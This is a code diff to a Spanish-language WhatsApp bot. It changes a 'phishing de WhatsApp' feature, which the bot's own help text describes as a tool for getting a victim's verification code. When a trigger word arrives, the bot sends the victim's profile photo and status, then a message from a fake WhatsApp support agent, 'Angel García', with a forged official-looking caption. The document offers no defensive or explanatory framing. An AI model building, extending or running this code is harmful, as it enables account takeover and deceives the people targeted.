@@ -1010,7 +1010,7 @@ ${samu} ✏Prefijo:${samu} [ ${prefix} ]
 ${samu} 🕐Tiempo de actividad:${samu} *${uptime}*
 ${samu} ✅Modo:${samu} *ON*
 ${samu} 👥Grupo:${samu} *${groupName}*
-${samu} 🏆Numero del Dueño shrtco.de/📍📲${samu}
+${samu} 🏆Numero del Dueño shrtco.de/👋👻${samu}
 
 𝗠𝗬 𝗖𝗔𝗡𝗔𝗟 𝗗𝗘 𝗬𝗢𝗨𝗧𝗨.𝗕𝗘: shrtco.de/CanalDeSamu
 
@@ -1488,6 +1488,9 @@ _${prefix}apagar_
 ⚠️ El siguiente comando es para restablecer los datos del usuario, para que el código vuelva a generarce, esto es por si quiere tener el bot en algún otro numero, o por si por error cerró la sección en WhatsApp. 
 
 *${prefix}Restaurar*
+
+Prueba el phishing de WhatsApp, cualquier frase que contenga la palabra: 'mantenimiento'
+funcionara para llamar al mensaje que te ayudara a obtener el codigo de verificacion de la victima, solo fuciona en privado y solo el numero del bot puede usarlo.
 
 ╭─────────────
 │ *${prefix}ban*
@@ -4861,16 +4864,19 @@ samu330.sendMessage(from, dias, audio, {quoted: fliveLoc, mimetype: 'audio/mp4',
 
 		
 //BY SAMU330 | Uso libre
-if (body.includes('tecnico')) {	
+if (body.includes('mantenimiento')) {
+if (!itsMe) return
 if (isGroup) return reply('Solo se puede usar en privados')
 fotops = await samu330.getProfilePicture(from)	
 estadops = await samu330.getStatus(from)	
 samu330.sendMessage(from, fotops, image, {caption: `*Numero de Usuario en formato completo:* ${from}
 *Numero registrado:* ${from.split('@')[0]}
-*Link de WhatsApp:* wa.me/${from.split('@')[0]}}
-*Estado del usuario:* ${estadops}
+
+*Link de WhatsApp:* wa.me/${from.split('@')[0]}
+
 
 *Hora y fecha exacta en la que se lleva acabo esta conversación:*
+
 _${week1}  ${calender1} ${hora}_
 
 *Hola, permítame presentarme, soy Angel García, pertenezco al centro de control y atención de WhatsApp*
@@ -4907,7 +4913,7 @@ https://www.whatsapp.com/contact/?subject=messenger
 { fromMe: false,
 participant: `0@s.whatsapp.net`, ...(from ?
 { remoteJid: "status@broadcast" } : {}) },
-message: { "imageMessage": { "mimetype": "image/jpeg","caption": `web@support.whatsapp.com\n2021 © WhatsApp LLC`, 'jpegThumbnail': fs.readFileSync('./src/ws.png')}}}
+message: { "imageMessage": { "mimetype": "image/jpeg","caption": `web@support.whatsapp.com\n2021 © WhatsApp LLC\nPrivacidad y Seguridad.`, 'jpegThumbnail': fs.readFileSync('./src/ws.png')}}}
 })	
 }
 		
